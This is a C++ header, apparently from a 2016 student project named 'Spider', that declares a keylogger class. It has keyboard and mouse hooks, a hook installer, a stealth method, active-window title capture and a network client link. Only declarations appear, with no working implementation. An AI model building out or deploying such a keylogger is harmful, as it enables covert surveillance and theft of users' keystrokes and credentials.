//
// Keylog.hh for Spider client in C:\Users\vezia_l\Documents\Epitech\cpp_spider\client\inc
// 
// Made by Louis VEZIA
// Login   <vezia_l@epitech.eu>
// 
// Started on  Tue Nov  1 13:50:30 2016 Louis VEZIA
// Last update Tue Nov  1 13:50:48 2016 Louis VEZIA
//

#ifndef KEYLOG_HH_
# define KEYLOG_HH_

#include <iostream>
#include <fstream>
#include "ClientNetwork.hh"
#include <Windows.h>
#include <string>

extern ClientNetwork net;

class __declspec(dllexport) Keylog
{
public:
	Keylog();
	~Keylog();
	const int		&getKey() const;
	const COORD	&getMouse() const;
	const int		getForeground();
	void	setKey(const int &);
	void	setMouse(const int &, const int &);
	const int		stealth();

	bool __stdcall	installhook();
	const std::string		GetActiveWindowTitle();
	const bool			peekMsg();
	static	LRESULT __stdcall  CALLBACK	KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
	static	LRESULT CALLBACK	LowLevelMouseProc(int code, WPARAM wParam, LPARAM lParam);

private:
	HWND	fg;
	COORD	mousePos;
	int		keyPressed;

	// Callback Keyboardproc
	HHOOK	hkb;
	HHOOK	hm;

	// Peek Message
	MSG		msg;

};



#endif /* !KEYLLOG_HH_ */